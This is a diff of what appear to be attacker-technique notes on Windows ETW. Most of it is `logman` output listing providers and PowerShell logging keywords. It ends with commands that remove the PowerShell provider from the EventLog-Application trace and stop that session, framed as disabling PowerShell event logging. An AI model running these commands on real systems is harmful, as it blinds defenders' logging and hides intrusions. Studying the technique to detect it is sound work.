@@ -319,35 +319,38 @@ Filter Type:          0
 
 <SNIP>
 
-Provider:
-Name:                 Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager
-Provider Guid:        {AAF67066-0BF8-469F-AB76-275590C434EE}
-Level:                255
-KeywordsAll:          0x0
-KeywordsAny:          0x8000000000000000 (Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager/Operational)
-Properties:           65
-Filter Type:          0
 
-<SNIP>
+C:\Users\Administrator>logman query providers Microsoft-Windows-PowerShell
 
+Provider                                 GUID
+-------------------------------------------------------------------------------
+Microsoft-Windows-PowerShell             {A0C1853B-5C40-4B15-8766-3CF1C58F985A}
 
-PS C:\Users\Administrator> logman stop EventLog-Application -ets
-Error:
-Access is denied.
-Try running this command as an administrator.
+Value               Keyword              Description
+-------------------------------------------------------------------------------
+0x0000000000000001  Runspace             PowerShell Runspace
+0x0000000000000002  Pipeline             Pipeline of Commands
+0x0000000000000004  Protocol             PowerShell remoting protocol
+0x0000000000000008  Transport            PowerShell remoting transport
+0x0000000000000010  Host                 PowerShell remoting host proxy calls
+0x0000000000000020  Cmdlets              All remoting cmdlets
+0x0000000000000040  Serializer           The serialization layer
+0x0000000000000080  Session              All session layer
+0x0000000000000100  Plugin               The managed PowerShell plugin worker
+0x0000000000000200  PSWorkflow           PSWorkflow Hosting And Execution Layer
+0x0001000000000000  win:ResponseTime     Response Time
+0x8000000000000000  Microsoft-Windows-PowerShell/Operational Microsoft-Windows-PowerShell/Operational
+0x4000000000000000  Microsoft-Windows-PowerShell/Analytic Microsoft-Windows-PowerShell/Analytic
+0x2000000000000000  Microsoft-Windows-PowerShell/Debug Microsoft-Windows-PowerShell/Debug
+0x1000000000000000  Microsoft-Windows-PowerShell/Admin Microsoft-Windows-PowerShell/Admin
 
-=> Using a Local System 
-
-C:\WINDOWS\system32>whoami
-nt authority\system
-
-C:\WINDOWS\system32>logman stop EventLog-Application -ets
-The command completed successfully.
-
-C:\WINDOWS\system32>logman query "EventLog-Application" -ets
-Error:
-Data Collector Set was not found.
-
+Value               Level                Description
+-------------------------------------------------------------------------------
+0x02                win:Error            Error
+0x03                win:Warning          Warning
+0x04                win:Informational    Information
+0x05                win:Verbose          Verbose
+0x14                Debug                Debug level defined by PowerShell (which is above Informational defined by system)
 
 
 PS C:\Users\Administrator> logman query providers -pid $pid
@@ -369,6 +372,24 @@ Microsoft-Windows-Crypto-BCrypt          {C7E089AC-BA2A-11E0-9AF7-68384824019B}
 Microsoft-Windows-Crypto-RSAEnh          {152FDB2B-6E9D-4B60-B317-815D5F174C4A}
 Microsoft-Windows-Deplorch               {B9DA9FE6-AE5F-4F3E-B2FA-8E623C11DC75}
 <SNIP>
+
+
+=> The following PowerShell code immediately disables Microsoft-Windows-PowerShell event logging until
+   a reboot occurs or the attacker restores the ETW provider:
+
+C:\Users\Administrator>logman update trace EventLog-Application --p Microsoft-Windows-PowerShell -ets
+The command completed successfully.
+
+C:\Users\Administrator.PO718687>logman stop EventLog-Application -ets
+The command completed successfully.
+
+
+C:\Users\Administrator.PO718687>logman query "EventLog-Application" -ets
+Error:
+Data Collector Set was not found.
+
+C:\Users\Administrator.PO718687>logman start EventLog-Application -ets
+The command completed successfully.
 
 
 
